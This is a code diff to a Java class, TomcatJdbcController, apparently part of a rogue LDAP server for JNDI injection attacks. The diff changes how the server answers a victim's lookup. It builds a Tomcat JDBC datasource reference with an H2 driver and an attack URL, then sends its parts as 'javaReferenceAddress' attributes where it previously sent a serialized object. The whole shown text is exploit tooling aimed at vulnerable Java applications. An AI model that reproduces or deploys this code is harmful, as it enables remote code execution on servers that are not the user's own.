@@ -14,9 +14,11 @@ import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
 import org.fusesource.jansi.Ansi;
 
+import javax.naming.RefAddr;
 import javax.naming.StringRefAddr;
 import java.io.IOException;
 import java.lang.reflect.Field;
+import java.util.Enumeration;
 import javax.naming.Reference;
 
 import static org.fusesource.jansi.Ansi.ansi;
@@ -64,8 +66,15 @@ public class TomcatJdbcController implements LdapController {
             ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"));
             ref.add(new StringRefAddr("url", JDBC_URL1));
             ref.add(new StringRefAddr("initialSize", "1"));
-            e.addAttribute("javaClassName", "java.lang.String");
-            e.addAttribute("javaSerializedData", Util.serialize(ref));
+
+            Enumeration<RefAddr> enumeration = ref.getAll();
+            int                  posn        = 0;
+
+            while (enumeration.hasMoreElements()) {
+                StringRefAddr addr = (StringRefAddr) enumeration.nextElement();
+                e.addAttribute("javaReferenceAddress", "#" + posn + "#" + addr.getType() + "#" + addr.getContent());
+                posn ++;
+            }
             result.sendSearchEntry(e);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
         } catch (Throwable er) {
